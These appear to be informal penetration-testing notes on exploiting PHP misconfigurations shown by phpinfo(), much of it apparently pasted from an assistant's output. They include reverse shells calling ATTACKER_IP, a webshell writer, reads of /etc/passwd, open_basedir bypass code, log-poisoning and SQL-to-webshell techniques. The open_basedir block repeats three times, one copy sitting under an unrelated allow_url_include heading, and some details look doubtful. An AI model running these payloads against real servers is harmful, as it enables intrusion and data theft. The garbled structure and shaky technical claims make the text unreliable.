check for exposed database credentials [WIP, how to check, check which keywords]

SPX: lookout if under SPX section http_key is shown or smth idk how SPX works. maybe needs ip_whitelist to be * and http_enabled to be 1

Apache Environment: check for DOCUMENT_ROOT or include_path in other applications for directory traversal attacks [WIP, be more specific]

check for outdated apache, nginx, FFI, imagemagick, xsl, sql or database versions. update any found software versions into software and veriosn list

## Section: Core
<details>
if u can inject PHP or hv unsanitised user input: 

some backdoors available at usr/share/webshells/php

### disable_functions
<details>
If **`disable_functions`** in **`phpinfo()`** shows **"no value"**, it means **no functions are disabled**, and **dangerous functions (like `exec`, `system`, `shell_exec`, `passthru`, etc.) are fully available**. This is a serious misconfiguration that can lead to **Remote Code Execution (RCE)** if an attacker finds a way to inject and execute PHP code.

---

### **How to Abuse Unrestricted Functions?**

Since no functions are disabled, you can exploit them in several ways:

### **1. Direct Command Execution (If You Can Execute PHP)**

If you find a way to inject PHP (e.g., via file upload, LFI, or unsafe **`eval()`**), you can run system commands:


```php
<?php
system("id");           // Runs 'id' and prints output
echo exec("whoami");    // Runs 'whoami' and returns output
shell_exec("ls -la");   // Executes command (silent unless printed)
passthru("uname -a");   // Directly outputs command result
?>
```

**Example Exploits:**

- **File Upload Bypass** (Upload **`.php`** with malicious code)
- **LFI to RCE** (Log poisoning, **`/proc/self/environ`** manipulation)
- **Unsafe `eval()`** (If user input reaches **`eval()`**)

### **2. Reverse Shell (If You Have Code Execution)**

If you can execute commands, spawn a reverse shell:


```php
<?php
$sock = fsockopen("ATTACKER_IP", 4444);
exec("/bin/sh -i <&3 >&3 2>&3");  // Classic Bash reverse shell
?>
```

**Alternative Shell Methods:**

- **PHP one-liner reverse shell**:
    
    ```php
    <?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
    ```
    
- **Python/PHP/Perl alternatives** if Bash is restricted.

### **3. File Read/Write (If You Need Data Exfiltration)**

Read sensitive files:


```php
<?php
echo file_get_contents("/etc/passwd");   // Read system files
file_put_contents("shell.php", "<?php system(\$_GET['cmd']); ?>"); // Write a webshell
?>
```

### **4. Bypassing Additional Restrictions**

Even if **`disable_functions`** is empty, check for:

- **`open_basedir`** (limits file access to certain directories)
- **`safe_mode`** (deprecated, but may still be enabled)
- **SELinux/AppArmor** (kernel-level restrictions)

---

### **Common Attack Vectors to Gain Initial Execution**

Since **`phpinfo()`** itself doesn’t execute code, you need another way to run PHP commands. Look for:

1. **File Upload Vulnerabilities**
    - Upload a **`.php`** file (e.g., disguised as an image).
    - Try null-byte tricks (**`shell.php%00.jpg`** in old PHP versions).
2. **Local File Inclusion (LFI) → RCE**
    - Include log files (**`/var/log/apache2/access.log`**) and inject PHP via User-Agent.
    - Poison **`PHPSESSID`** or other writable files.
3. **Unserialize() Exploits**
    - If the app uses **`unserialize()`**, exploit it for RCE (e.g., via **`phar://`** deserialization).
4. **SQL Injection → Write Webshell**
    - If the DB has file-write privileges (**`SELECT ... INTO OUTFILE '/var/www/shell.php'`**).
5. **XXE (XML External Entity) Attacks**
    - If PHP’s **`libxml_disable_entity_loader`** is off, read files via XXE.
</details>

### open_basedir
<details>
Look for **`open_basedir`** in the PHP configuration section.

- If **empty** → No restrictions (full filesystem access).
- If **set but incorrect** → Possible bypasses.

Example from **`phpinfo()`**:

```
Directive           Local Value  Master Value
open_basedir       /var/www/html  /var/www/html
```

This means PHP scripts can **only** access files inside **`/var/www/html`**.

---

## **2. Testing for Misconfigurations**

### **A. Using PHP to Check Access**

Try reading files outside the allowed path:

```php
<?php
// Attempt to read /etc/passwd
echo file_get_contents('/etc/passwd');
?>
```

- **If successful** → **`open_basedir`** is **not enforced** or misconfigured.
- **If blocked** → **`open_basedir`** is working (but may still be bypassable).

### **B. Common Misconfigurations**

1. **Multiple Paths Without Proper Separation**
    - Example: **`open_basedir = /var/www/html:/tmp`**
    - If **`/tmp`** is writable, upload a malicious PHP file there and include it.
2. **Missing Trailing Slash**
    - **Bad**: **`open_basedir = /var/www/html`**
        - May allow accessing **`/var/www/html_secret`** if it exists.
    - **Good**: **`open_basedir = /var/www/html/`** (trailing slash restricts strictly).
3. **Wildcard Misuse**
    - **Bad**: **`open_basedir = /var/www/*`**
        - Might allow escaping via path traversal (**`/var/www/../etc/passwd`**).

---

## **3. Bypassing `open_basedir` (If Misconfigured)**

If **`open_basedir`** is set but weak, try these bypasses:

### **A. Using `symlink()` (Race Condition)**

If you can create symlinks, you may escape:

```php
<?php
mkdir('exploit');
chdir('exploit');
mkdir('traversed');
chdir('traversed');
symlink('../../../../etc/passwd', 'link');
chdir('..');
symlink('exploit/traversed/link', 'bypass');
echo file_get_contents('bypass');
?>
```

*(Works on some PHP versions when **`symlink`** is allowed.)*

### **B. Using `glob://` (Directory Browsing)**

If **`open_basedir`** blocks **`file_get_contents()`**, try:

```php
<?php
$files = glob('/*');
print_r($files);  // Lists root dir files
?>
```

### **C. Using `chdir()` + `ini_set()` Trick**

Some PHP versions allow:

```php
<?php
mkdir('exploit');
chdir('exploit');
ini_set('open_basedir', '..');
chdir('..'); chdir('..'); chdir('..');
ini_set('open_basedir', '/');
echo file_get_contents('/etc/passwd');
?>
```

*(Depends on PHP version and **`disable_functions`**.)*

### **D. Using `SplFileObject` (PHP 5.3+)**

If **`SplFileObject`** is available:

```php
<?php
$file = new SplFileObject('/etc/passwd');
echo $file->fread($file->getSize());
?>
```

- Core
    
    ## **1. Checking `open_basedir` in `phpinfo()`**
    
    Look for **`open_basedir`** in the PHP configuration section.
    
    - If **empty** → No restrictions (full filesystem access).
    - If **set but incorrect** → Possible bypasses.
    
    Example from **`phpinfo()`**:
    
    ```
    Directive           Local Value  Master Value
    open_basedir       /var/www/html  /var/www/html
    ```
    
    This means PHP scripts can **only** access files inside **`/var/www/html`**.
    
    ---
    
    ## **2. Testing for Misconfigurations**
    
    ### **A. Using PHP to Check Access**
    
    Try reading files outside the allowed path:
    
    ```php
    <?php
    // Attempt to read /etc/passwd
    echo file_get_contents('/etc/passwd');
    ?>
    ```
    
    - **If successful** → **`open_basedir`** is **not enforced** or misconfigured.
    - **If blocked** → **`open_basedir`** is working (but may still be bypassable).
    
    ### **B. Common Misconfigurations**
    
    1. **Multiple Paths Without Proper Separation**
        - Example: **`open_basedir = /var/www/html:/tmp`**
        - If **`/tmp`** is writable, upload a malicious PHP file there and include it.
    2. **Missing Trailing Slash**
        - **Bad**: **`open_basedir = /var/www/html`**
            - May allow accessing **`/var/www/html_secret`** if it exists.
        - **Good**: **`open_basedir = /var/www/html/`** (trailing slash restricts strictly).
    3. **Wildcard Misuse**
        - **Bad**: **`open_basedir = /var/www/*`**
            - Might allow escaping via path traversal (**`/var/www/../etc/passwd`**).
    
    ---
    
    ## **3. Bypassing `open_basedir` (If Misconfigured)**
    
    If **`open_basedir`** is set but weak, try these bypasses:
    
    ### **A. Using `symlink()` (Race Condition)**
    
    If you can create symlinks, you may escape:
    
    ```php
    <?php
    mkdir('exploit');
    chdir('exploit');
    mkdir('traversed');
    chdir('traversed');
    symlink('../../../../etc/passwd', 'link');
    chdir('..');
    symlink('exploit/traversed/link', 'bypass');
    echo file_get_contents('bypass');
    ?>
    ```
    
    *(Works on some PHP versions when **`symlink`** is allowed.)*
    
    ### **B. Using `glob://` (Directory Browsing)**
    
    If **`open_basedir`** blocks **`file_get_contents()`**, try:
    
    ```php
    <?php
    $files = glob('/*');
    print_r($files);  // Lists root dir files
    ?>
    ```
    
    ### **C. Using `chdir()` + `ini_set()` Trick**
    
    Some PHP versions allow:
    
    ```php
    <?php
    mkdir('exploit');
    chdir('exploit');
    ini_set('open_basedir', '..');
    chdir('..'); chdir('..'); chdir('..');
    ini_set('open_basedir', '/');
    echo file_get_contents('/etc/passwd');
    ?>
    ```
    
    *(Depends on PHP version and **`disable_functions`**.)*
    
    ### **D. Using `SplFileObject` (PHP 5.3+)**
    
    If **`SplFileObject`** is available:
    
    ```php
    <?php
    $file = new SplFileObject('/etc/passwd');
    echo $file->fread($file->getSize());
    ?>
    ```
</details>

### allow_url_include & allow_url_fopen
<details>
## **1. Checking `open_basedir` in `phpinfo()`**

Look for **`open_basedir`** in the PHP configuration section.

- If **empty** → No restrictions (full filesystem access).
- If **set but incorrect** → Possible bypasses.

Example from **`phpinfo()`**:

```
Directive           Local Value  Master Value
open_basedir       /var/www/html  /var/www/html
```

This means PHP scripts can **only** access files inside **`/var/www/html`**.

---

## **2. Testing for Misconfigurations**

### **A. Using PHP to Check Access**

Try reading files outside the allowed path:

```php
<?php
// Attempt to read /etc/passwd
echo file_get_contents('/etc/passwd');
?>
```

- **If successful** → **`open_basedir`** is **not enforced** or misconfigured.
- **If blocked** → **`open_basedir`** is working (but may still be bypassable).

### **B. Common Misconfigurations**

1. **Multiple Paths Without Proper Separation**
    - Example: **`open_basedir = /var/www/html:/tmp`**
    - If **`/tmp`** is writable, upload a malicious PHP file there and include it.
2. **Missing Trailing Slash**
    - **Bad**: **`open_basedir = /var/www/html`**
        - May allow accessing **`/var/www/html_secret`** if it exists.
    - **Good**: **`open_basedir = /var/www/html/`** (trailing slash restricts strictly).
3. **Wildcard Misuse**
    - **Bad**: **`open_basedir = /var/www/*`**
        - Might allow escaping via path traversal (**`/var/www/../etc/passwd`**).

---

## **3. Bypassing `open_basedir` (If Misconfigured)**

If **`open_basedir`** is set but weak, try these bypasses:

### **A. Using `symlink()` (Race Condition)**

If you can create symlinks, you may escape:

```php
<?php
mkdir('exploit');
chdir('exploit');
mkdir('traversed');
chdir('traversed');
symlink('../../../../etc/passwd', 'link');
chdir('..');
symlink('exploit/traversed/link', 'bypass');
echo file_get_contents('bypass');
?>
```

*(Works on some PHP versions when **`symlink`** is allowed.)*

### **B. Using `glob://` (Directory Browsing)**

If **`open_basedir`** blocks **`file_get_contents()`**, try:

```php
<?php
$files = glob('/*');
print_r($files);  // Lists root dir files
?>
```

### **C. Using `chdir()` + `ini_set()` Trick**

Some PHP versions allow:

```php
<?php
mkdir('exploit');
chdir('exploit');
ini_set('open_basedir', '..');
chdir('..'); chdir('..'); chdir('..');
ini_set('open_basedir', '/');
echo file_get_contents('/etc/passwd');
?>
```

*(Depends on PHP version and **`disable_functions`**.)*

### **D. Using `SplFileObject` (PHP 5.3+)**

If **`SplFileObject`** is available:

```php
<?php
$file = new SplFileObject('/etc/passwd');
echo $file->fread($file->getSize());
?>
```
</details>
</details>

